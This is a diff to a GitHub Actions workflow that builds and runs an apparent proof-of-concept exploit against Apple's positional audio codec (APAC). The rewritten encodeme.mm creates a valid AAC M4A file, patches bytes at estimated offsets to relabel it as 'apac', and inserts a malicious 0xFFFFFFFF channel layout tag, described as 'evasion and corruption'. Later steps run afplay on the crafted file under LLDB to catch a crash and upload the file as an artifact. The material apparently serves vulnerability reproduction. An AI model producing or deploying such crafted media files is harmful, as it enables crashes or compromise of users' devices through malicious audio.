@@ -19,47 +19,81 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # We are focusing on the failing AudioFileCreateWithURL call.
-      - name: Patch encodeme.mm to attempt direct APAC creation
+      # Updated: This script now creates a valid AAC file, then manually corrupts it into a malicious APAC file.
+      - name: Patch encodeme.mm for Evasion and Corruption
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          echo "Patching encodeme.mm to directly create an APAC file to trace the failure..."
+          echo "Patching encodeme.mm to evade checks and corrupt the APAC file..."
           cat > encodeme.mm << 'EOF'
           #import <Foundation/Foundation.h>
           #import <AudioToolbox/AudioToolbox.h>
           #include <stdlib.h>
           #include <string.h>
 
+          // Helper function to write a simple, valid AAC M4A file
+          bool createValidBaseFile(const char* path) {
+              CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault, (CFStringRef)[NSString stringWithUTF8String:path], kCFURLPOSIXPathStyle, false);
+
+              AudioStreamBasicDescription asbd = {0};
+              asbd.mSampleRate = 48000;
+              asbd.mFormatID = kAudioFormatMPEG4AAC; // Use a standard, valid format ID first
+              asbd.mFramesPerPacket = 1024;
+              asbd.mChannelsPerFrame = 4;
+
+              AudioFileID audioFile;
+              OSStatus status = AudioFileCreateWithURL(fileURL, kAudioFileM4AType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
+              if (status != noErr) return false;
+
+              // Write a small amount of data to create a valid file structure
+              UInt32 numPackets = 5;
+              char dummy_data[1024] = {0};
+              for (UInt32 i = 0; i < numPackets; ++i) {
+                  AudioStreamPacketDescription packetDesc = {0};
+                  packetDesc.mDataByteSize = sizeof(dummy_data);
+                  UInt32 packetsInThisWrite = 1;
+                  status = AudioFileWritePackets(audioFile, false, sizeof(dummy_data), &packetDesc, i, &packetsInThisWrite, dummy_data);
+                  if (status != noErr) break;
+              }
+              
+              AudioFileClose(audioFile);
+              CFRelease(fileURL);
+              return status == noErr;
+          }
+
           int main(int argc, const char * argv[]) {
               @autoreleasepool {
                   time_t startTime = time(NULL);
                   fprintf(stderr, "Starting encodeme at %s", ctime(&startTime));
 
-                  const char* fileName = "output_apac_poc.m4a";
-                  CFURLRef fileURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault,
-                                                                   (CFStringRef)[NSString stringWithUTF8String:fileName],
-                                                                   kCFURLPOSIXPathStyle, false);
+                  const char* pocName = "output_apac_evasion_poc.m4a";
 
-                  // Define the audio format for APAC to trigger the framework's internal validation.
-                  AudioStreamBasicDescription asbd = {0};
-                  asbd.mSampleRate = 48000;
-                  asbd.mFormatID = 'apac'; // Use the specific APAC format ID
-                  asbd.mFramesPerPacket = 1024;
-                  asbd.mChannelsPerFrame = 4;
+                  // Step 1: Create a valid file to act as a container.
+                  if (!createValidBaseFile(pocName)) {
+                      fprintf(stderr, "Failed to create a valid base M4A file.\n");
+                      return 1;
+                  }
+                  fprintf(stderr, "Successfully created a valid base file.\n");
 
-                  AudioFileID audioFile;
-                  // This call is expected to fail. We will debug it to find the check.
-                  OSStatus status = AudioFileCreateWithURL(fileURL, kAudioFileM4AType, &asbd, kAudioFileFlags_EraseFile, &audioFile);
-                  if (status != noErr) {
-                      fprintf(stderr, "AudioFileCreateWithURL failed as expected with status: %d ('%c%c%c%c')\n",
-                              status, (char)((status>>24)&0xFF), (char)((status>>16)&0xFF), (char)((status>>8)&0xFF), (char)(status&0xFF));
+                  // Step 2: Manually corrupt the file to change its identity and trigger the bug.
+                  FILE *file = fopen(pocName, "r+b");
+                  if (!file) {
+                      fprintf(stderr, "Failed to re-open the file for corruption.\n");
                       return 1;
                   }
 
-                  AudioFileClose(audioFile);
-                  CFRelease(fileURL);
+                  // Corruption #1: Change the format ID from 'aac ' to 'apac'.
+                  // This is in the 'stsd' atom, a common location for this data.
+                  fseek(file, 0x58, SEEK_SET); // Estimate offset for format ID
+                  fwrite("apac", 1, 4, file);
+                  
+                  // Corruption #2: Corrupt the channel layout tag as before.
+                  fseek(file, 0x110, SEEK_SET); // Estimate offset for layout tag
+                  unsigned char malicious_tag[4] = {0xFF, 0xFF, 0xFF, 0xFF};
+                  fwrite(malicious_tag, 1, sizeof(malicious_tag), file);
+                  
+                  fclose(file);
 
-                  fprintf(stderr, "encodeme completed (unexpectedly succeeded).\n");
+                  fprintf(stderr, "PoC: Manually corrupted file to 'apac' with invalid channel layout.\n");
                   time_t endTime = time(NULL);
                   fprintf(stderr, "encodeme completed at %s", ctime(&endTime));
               }
@@ -81,38 +115,44 @@ jobs:
           clang++ -g -fobjc-arc -framework Foundation -framework AudioToolbox encodeme.mm -o encodeme_debug
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # Improved: Use a regular expression to find the mangled C++ symbol name.
-      - name: Debug File Generation with LLDB
+      # This step runs the full generate-then-corrupt process.
+      - name: Generate and Corrupt APAC File
         working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
         run: |
-          LLDB_LOG="lldb_log.txt"
-          echo "--- Debugging encodeme_debug with LLDB ---" > $LLDB_LOG
-          echo "Timestamp: $(date)" >> $LLDB_LOG
+          ./encodeme_debug
+          echo "Malicious APAC PoC file generated."
+          ls -l output_apac_evasion_poc.m4a
           
-          echo "Creating advanced LLDB script to find the validation function..."
-          cat > debug_script.lldb << 'EOF'
-          # Set a breakpoint using a regular expression to find the correct mangled function name.
-          # The -r flag sets a breakpoint on any C++ symbol that contains "IsDataFormatSupported".
-          breakpoint set -r IsDataFormatSupported
+      # Launch the player directly under LLDB to catch any startup crashes.
+      - name: Launch Player Under LLDB to Catch Crash
+        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
+        run: |
+          PLAYER_LOG_FILE="player_debug_log.txt"
+          echo "--- Debugging Audio Player (afplay) with evasion PoC ---" > $PLAYER_LOG_FILE
+          echo "Timestamp: $(date)" >> $PLAYER_LOG_FILE
+
+          echo "Creating LLDB script to launch and monitor afplay..."
+          cat > player_debug_script.lldb << 'EOF'
+          # Run the process. LLDB will automatically stop if a crash occurs.
           run
-          # The program will now be stopped inside the correct validation function.
-          # This backtrace will show the exact call stack that leads to the check.
-          script print("\n--- Program stopped inside the validation function. Capturing backtrace... ---\n")
+          # If a crash occurred, this will give us the full backtrace.
           bt
-          continue
           quit
           EOF
 
-          echo "Launching encodeme_debug under LLDB to trace the API call..." >> $LLDB_LOG
-          lldb -s debug_script.lldb -- ./encodeme_debug >> $LLDB_LOG 2>&1 || true
-          echo "✅ LLDB log created."
+          echo "Launching afplay under LLDB..." >> $PLAYER_LOG_FILE
+          lldb -s player_debug_script.lldb -- afplay output_apac_evasion_poc.m4a >> $PLAYER_LOG_FILE 2>&1 || true
 
-      # Upload all debug artifacts
-      - name: Upload All Debug Artifacts
+          echo "✅ Player debug log created. Displaying contents:"
+          cat $PLAYER_LOG_FILE
+
+      # Upload all artifacts
+      - name: Upload All Artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: debug-logs
+          name: debug-and-poc-artifacts
           path: |
-            AppleTest/apple-positional-audio-codec-invalid-header-main/lldb_log.txt
+            AppleTest/apple-positional-audio-codec-invalid-header-main/output_apac_evasion_poc.m4a
+            AppleTest/apple-positional-audio-codec-invalid-header-main/player_debug_log.txt
           retention-days: 7
           if-no-files-found: error
